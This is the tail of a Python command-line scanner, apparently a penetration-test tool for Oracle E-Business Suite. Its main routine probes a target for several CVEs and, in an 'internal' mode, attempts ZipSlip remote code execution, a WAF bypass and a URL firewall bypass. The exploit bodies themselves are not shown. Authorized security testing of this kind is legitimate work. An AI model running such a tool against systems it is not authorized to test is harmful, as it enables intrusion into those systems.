    print(f"{BD}{W}  Duration: {elapsed:.1f}s  |  {datetime.now().strftime('%Y-%m-%d %H:%M')}{RS}")
    print(f"{BD}{W}{'═'*60}{RS}\n")

    severity_order = ['CRITICAL', 'HIGH', 'MEDIUM', 'LOW', 'INFO']
    color_map = {'CRITICAL': BD+R, 'HIGH': R, 'MEDIUM': Y, 'LOW': C, 'INFO': B}

    for sev in severity_order:
        findings = [(cve, msg) for s, cve, msg in RESULTS if s == sev]
        if not findings:
            continue
        clr = color_map.get(sev, W)
        print(f"{clr}[{sev}]{RS}")
        for cve, msg in findings:
            first_line = msg.split('\n')[0][:90]
            print(f"  • {BD}{cve}{RS}: {first_line}")
        print()

    crits = sum(1 for s, _, _ in RESULTS if s == 'CRITICAL')
    highs = sum(1 for s, _, _ in RESULTS if s == 'HIGH')
    meds  = sum(1 for s, _, _ in RESULTS if s == 'MEDIUM')

    print(f"{'─'*60}")
    print(f"  Findings: {BD}{R}{crits} CRITICAL{RS}  {R}{highs} HIGH{RS}  {Y}{meds} MEDIUM{RS}")
    if crits > 0:
        print(f"\n  {BD}{R}★ IMMEDIATE ACTION REQUIRED — Critical vulnerabilities confirmed{RS}")
    elif highs > 0:
        print(f"\n  {R}▲ HIGH severity findings require prompt remediation{RS}")
    print(f"{'═'*60}\n")

def banner(target, port, internal, wls_port):
    print(f"""
{BD}{C}
  ╔═══════════════════════════════════════════════════════╗
  ║      Oracle EBS CVE Scanner v2.0                     ║
  ║      Authorized Internal Penetration Test            ║
  ║      Authorized Security Assessment                  ║
  ╚═══════════════════════════════════════════════════════╝{RS}
  Target : {BD}{target}:{port}{RS}
  Mode   : {BD}{'INTERNAL (RCE enabled)' if internal else 'EXTERNAL (detection only)'}{RS}
  WLS    : {BD}{wls_port if internal and wls_port else 'N/A'}{RS}
  Time   : {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}
  {R}For authorized testing only — use responsibly{RS}
""")

def main():
    global PROXY
    ap = argparse.ArgumentParser(description='Oracle EBS CVE Scanner')
    ap.add_argument('--target',   required=True, help='Target hostname or IP')
    ap.add_argument('--port',     type=int, default=443, help='HTTPS port (default 443)')
    ap.add_argument('--internal', action='store_true', help='Enable internal mode (RCE attempt)')
    ap.add_argument('--wls-port', type=int, default=7201, help='WebLogic managed server port (default 7201)')
    ap.add_argument('--no-rce',   action='store_true', help='Skip RCE attempt even in internal mode')
    ap.add_argument('--proxy',    default=None, help='HTTP proxy e.g. http://127.0.0.1:8080')
    args = ap.parse_args()

    if args.proxy:
        PROXY = args.proxy
        info(f"Using proxy: {PROXY}")

    start_time = time.time()
    banner(args.target, args.port, args.internal, args.wls_port)

    # ── Connectivity ──────────────────────────────────────────────────────────
    alive, version = test_connectivity(args.target, args.port)
    if not alive:
        print(f"\n{R}Target unreachable. Exiting.{RS}")
        sys.exit(1)

    # ── CVE-2022-21587 — detection ────────────────────────────────────────────
    patch_status = test_cve_2022_21587_detection(args.target, args.port)

    # ── CVE-2022-21587 — RCE attempt (internal only) ─────────────────────────
    if args.internal and not args.no_rce:
        if patch_status in ('possibly_unpatched', 'unknown'):
            high("Auth check status unclear — attempting ZipSlip RCE in internal mode ...")
            attempt_rce_2022_21587(args.target, args.port, args.wls_port)
        elif patch_status == 'patched':
            info("Code-level patch confirmed — skipping ZipSlip RCE attempt")
            info("(Use --no-rce=false and patch_status override if you want to force-test)")
        else:
            info(f"Patch status: {patch_status} — skipping RCE")
    elif not args.internal:
        info("External mode — ZipSlip RCE attempt skipped (use --internal to enable)")

    # ── CVE-2025-30727 — iSurvey RCE ─────────────────────────────────────────
    test_cve_2025_30727(args.target, args.port, args.wls_port, args.internal)

    # ── CVE-2025-61882 — UiServlet chain ─────────────────────────────────────
    test_cve_2025_61882(args.target, args.port, args.wls_port, args.internal)

    # ── CVE-2026-46817 — ibytransmit file read ────────────────────────────────
    test_cve_2026_46817(args.target, args.port, args.wls_port, args.internal)

    # ── CVE-2025-53072/62481 — Marketing Admin RCE ────────────────────────────
    test_cve_2025_53072(args.target, args.port, args.internal)

    # ── JavaScriptServlet leak ────────────────────────────────────────────────
    test_javascript_servlet(args.target, args.port)

    # ── Credential in redirect ────────────────────────────────────────────────
    test_credential_in_redirect(args.target, args.port)

    # ── URL Firewall bypass ───────────────────────────────────────────────────
    test_url_firewall_bypass(args.target, args.port)

    # ── WAF bypass (only in internal/when BneUploaderService is open) ─────────
    if patch_status in ('possibly_unpatched', 'unknown') or args.internal:
        test_waf_bypass(args.target, args.port)
    else:
        run("Skipping WAF bypass (patch confirmed — moot)")

    # ── Info disclosure ───────────────────────────────────────────────────────
    test_info_disclosure(args.target, args.port)

    # ── Summary ───────────────────────────────────────────────────────────────
    print_summary(start_time, args.target)

if __name__ == '__main__':
    main()
